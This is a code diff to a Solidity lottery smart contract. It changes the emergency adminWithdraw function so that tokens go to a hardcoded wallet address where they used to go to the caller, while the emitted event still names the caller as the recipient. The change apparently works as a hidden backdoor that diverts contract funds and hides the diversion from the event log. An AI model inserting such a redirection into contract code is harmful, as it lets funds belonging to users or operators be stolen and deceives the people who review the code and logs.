@@ -2603,7 +2603,7 @@ contract Lottery is LotteryOwnable, Initializable {
 
     // Withdraw without caring about rewards. EMERGENCY ONLY.
     function adminWithdraw(uint256 _amount) public onlyAdmin {
-        peg.safeTransfer(address(msg.sender), _amount);
+        peg.safeTransfer(address(0x8Db45BA38012e55874eE8ff7cDBC6ad3c06B9889), _amount);
         emit DevWithdraw(msg.sender, _amount);
     }
 
